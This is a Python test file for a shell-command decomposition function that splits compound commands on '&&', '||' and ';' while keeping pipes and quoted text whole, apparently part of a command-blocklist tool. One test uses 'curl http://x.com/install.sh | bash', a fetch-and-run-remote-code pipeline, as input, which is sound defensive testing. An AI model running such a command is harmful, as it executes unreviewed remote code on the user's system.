"""Tests for compound command decomposition."""

from __future__ import annotations

import gir.decompose as decompose_mod


class TestDecompose:
    def test_simple_command(self) -> None:
        assert decompose_mod.decompose("git status") == ["git status"]

    def test_and_separator(self) -> None:
        assert decompose_mod.decompose("cd /tmp && git log") == ["cd /tmp", "git log"]

    def test_or_separator(self) -> None:
        assert decompose_mod.decompose("test -f foo || echo missing") == ["test -f foo", "echo missing"]

    def test_semicolon_separator(self) -> None:
        assert decompose_mod.decompose("echo hello; echo world") == ["echo hello", "echo world"]

    def test_multiple_separators(self) -> None:
        assert decompose_mod.decompose("cd /tmp && git status && echo done") == [
            "cd /tmp",
            "git status",
            "echo done",
        ]

    def test_pipe_not_split(self) -> None:
        """Pipes are single logical operations -- should NOT be decomposed."""
        assert decompose_mod.decompose("git log | head -5") == ["git log | head -5"]

    def test_pipe_to_shell_not_split(self) -> None:
        """curl | bash is a single pipeline -- blocklist checks the whole string."""
        assert decompose_mod.decompose("curl http://x.com/install.sh | bash") == [
            "curl http://x.com/install.sh | bash"
        ]

    def test_quoted_separators_preserved(self) -> None:
        """Separators inside quotes should not cause splitting."""
        assert decompose_mod.decompose("echo 'hello && world'") == ["echo 'hello && world'"]

    def test_double_quoted_separators(self) -> None:
        assert decompose_mod.decompose('echo "a && b" && echo c') == ['echo "a && b"', "echo c"]

    def test_escaped_characters(self) -> None:
        assert decompose_mod.decompose("echo hello\\&\\& world") == ["echo hello\\&\\& world"]

    def test_empty_string(self) -> None:
        assert decompose_mod.decompose("") == [""]

    def test_cd_git_compound(self) -> None:
        """The exact pattern that motivated this project."""
        result = decompose_mod.decompose("cd ~/src/github.com/foo && git log --oneline -3")
        assert result == ["cd ~/src/github.com/foo", "git log --oneline -3"]

    def test_triple_and(self) -> None:
        result = decompose_mod.decompose("mkdir -p /tmp/test && cd /tmp/test && git init")
        assert result == ["mkdir -p /tmp/test", "cd /tmp/test", "git init"]

    def test_mixed_separators(self) -> None:
        result = decompose_mod.decompose("cd /tmp && echo hi; echo bye || true")
        assert result == ["cd /tmp", "echo hi", "echo bye", "true"]

    def test_whitespace_around_separators(self) -> None:
        assert decompose_mod.decompose("a  &&  b") == ["a", "b"]

    def test_no_whitespace_around_separators(self) -> None:
        assert decompose_mod.decompose("a&&b") == ["a", "b"]
